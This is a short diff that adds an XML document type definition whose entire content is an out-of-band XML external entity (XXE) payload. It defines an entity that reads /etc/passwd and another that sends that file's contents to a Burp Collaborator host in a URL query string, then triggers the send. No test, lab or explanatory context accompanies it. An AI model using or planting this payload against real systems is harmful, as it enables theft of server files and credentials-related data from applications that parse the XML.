@@ -1,0 +1,4 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!ENTITY % file SYSTEM "file:///etc/passwd">
+<!ENTITY % send SYSTEM "http://0pq1jm5mj26l4difqbr80ghpyg4asz.burpcollaborator.net/?data=%file;">
+%send;
